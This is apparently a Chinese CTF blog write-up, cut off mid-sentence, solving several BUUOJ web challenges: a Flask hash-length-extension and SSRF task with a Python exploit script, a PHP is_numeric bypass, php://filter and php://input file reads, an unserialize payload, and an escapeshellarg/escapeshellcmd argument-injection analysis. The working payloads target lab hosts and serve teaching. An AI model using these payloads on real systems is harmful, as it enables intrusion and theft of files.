class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):     </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码可知：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta 从我们传入的url 和 cookie中得到参数 -&gt; waf() 禁用敏感协议 -&gt; Task() -&gt; Exec()</span><br><span class=\"line\"></span><br><span class=\"line\">-&gt; 先检查Sign-checkSign()</span><br><span class=\"line\">     getSign(self.action, self.param) == self.sign</span><br><span class=\"line\">     hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">-&gt; 判断动作</span><br><span class=\"line\">\tscan-<span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action <span class=\"comment\"># 注意是 in</span></span><br><span class=\"line\">    </span><br><span class=\"line\">       tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">       resp = scan(self.param)</span><br><span class=\"line\">           urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">           <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">           tmpfile.write(resp)</span><br><span class=\"line\">        </span><br><span class=\"line\">\tread-<span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">       f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">       result[<span class=\"string\">'data'</span>] = f.read()</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们要先通过 <code>checkSign()</code> 的检查以后才能进行下一步。而在代码中专门给出一个路由，将生成的 Sign 发送给用户，也就是告诉了我们加密的结果。</p>\n<p>于是，我知道了 md5 加密的一个结果，从 <code>hashlib.md5(secert_key + param + action).hexdigest()</code> 以及 <code>secert_key</code> 长度已知，可以使用 <code>hash extend attack</code> 来构造合适的<code>sign</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Input Signature: <span class=\"number\">9</span>f1d78f610b5e32249e30d1161ff4e81</span><br><span class=\"line\">Input Data: local_file:flag.txtscan</span><br><span class=\"line\">Input Key Length: <span class=\"number\">16</span></span><br><span class=\"line\">Input Data to Add: read</span><br><span class=\"line\"><span class=\"number\">4</span>a0fa89f8745038437386ca78367e28d</span><br><span class=\"line\">local_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p>我们注意到要得到文件的内容需要 read in action , 于是我们填充 read 。</p>\n<p>payload.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://a917963c-0d87-4c23-b312-40315cbdd792.node3.buuoj.cn\"</span></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get Sign</span></span><br><span class=\"line\">route = <span class=\"string\">\"/geneSign\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">re1 = s.get(url + route+<span class=\"string\">\"?param=local_file:flag.txt\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re1.content, re1.request.headers</span><br><span class=\"line\"></span><br><span class=\"line\">hashs = <span class=\"string\">\"4a0fa89f8745038437386ca78367e28d\"</span></span><br><span class=\"line\">action = <span class=\"string\">\"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read\"</span></span><br><span class=\"line\"><span class=\"comment\"># action = a.replace(\"\\\\x\", \"%\")</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> action</span><br><span class=\"line\">cookie = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"action\"</span>: action,</span><br><span class=\"line\">    <span class=\"string\">\"sign\"</span>: hashs,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">route2 = <span class=\"string\">\"/De1ta\"</span></span><br><span class=\"line\">re2 = s.get(url + route2 + <span class=\"string\">\"?param=local_file:flag.txt\"</span>, cookies=cookie)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re2.content</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Buy-Flag\"><a href=\"#Buy-Flag\" class=\"headerlink\" title=\"Buy Flag\"></a>Buy Flag</h3><p>查看源码发现：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">\t$password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"password can't be number&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password Right!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>抓包传数据：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/pay.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: b1fc07df-c7ae-46e3-8a06-565ab682d9ca.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: user=1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 28</span><br><span class=\"line\"></span><br><span class=\"line\">money[]00000000&amp;password=404%23</span><br></pre></td></tr></table></figure>\n\n<p>发现身份验证不通过，看到 Cookie ，改成 1 ；绕过 <code>is_numeric</code> 加 </p>\n<p><code>%23</code> ; 传完又提示 money 长度过长，数组绕过。</p>\n<h3 id=\"nizhuansiwei\"><a href=\"#nizhuansiwei\" class=\"headerlink\" title=\"nizhuansiwei\"></a>nizhuansiwei</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code> 伪协议post数据： <code>php://input</code> ;</p>\n<p><code>include($file);</code> 这里包含了一个文件并且提示文件名字，我们再用另一个伪协议读一下文件内容：</p>\n<p><code>php://filter/convert.base64-encode/resource=useless.php</code></p>\n<p>*注：只有一个 <code>include()</code> 即可使用伪协议将文件内容包含出来</p>\n<p>将得到内容解密：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>进行序列化：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\">$a-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>\n\n<p>现在的 url ：<code>buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>\n<h3 id=\"include\"><a href=\"#include\" class=\"headerlink\" title=\"include\"></a>include</h3><p>伪协议 <code>?file=php://filter/convert.base64-encode/resource=index.php</code> 读一下源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&apos;hacker!&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &apos;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>哦，然后直接读 <code>flag.php</code></p>\n<h3 id=\"Online-Tool\"><a href=\"#Online-Tool\" class=\"headerlink\" title=\"Online Tool\"></a>Online Tool</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class=\"line\">    $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] = $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'host'</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $host = $_GET[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">    $host = escapeshellarg($host);</span><br><span class=\"line\">    $host = escapeshellcmd($host);</span><br><span class=\"line\">    $sandbox = md5(<span class=\"string\">\"glzjin\"</span>. $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'you are in sandbox '</span>.$sandbox;</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span>.$host);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>百度到文章</p>\n<p>我们编写示例代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param = <span class=\"string\">\"127.0.0.1' -v -d a=1\"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"curl \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">输出结果：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'127.0.0.1'</span>\\<span class=\"string\">''</span> -v -d a=<span class=\"number\">1</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">curl '</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\"><span class=\"string\">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class=\"line\"><span class=\"string\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: 127.0.0.1\\</span></span><br><span class=\"line\"><span class=\"string\">* Closing connection 0</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们输入 <code>127.0.0.1&#39; -v -d a=1</code> 后，经过 <code>escapeshellarg()</code> 转义变成<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1&#39;</code> 。</p>\n<p> <code>&#39;</code> 被转义为 <code>\\&#39;</code> ,被隔开的两部分分别左右两端加上一对 <code>&#39;&#39;</code> 然后连接在一起；</p>\n<p> 然后经过 <code>escapeshelcmd()</code> 后，变成了 <code>&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>, 可以看到上一步留下的 <code>\\</code> 再次被转义成 <code>\\\\</code> ，这时就只表示 <code>\\</code> ，不起转义作用，于是 <code>127.0.0.1</code> 单独成组，紧跟 <code>\\</code> 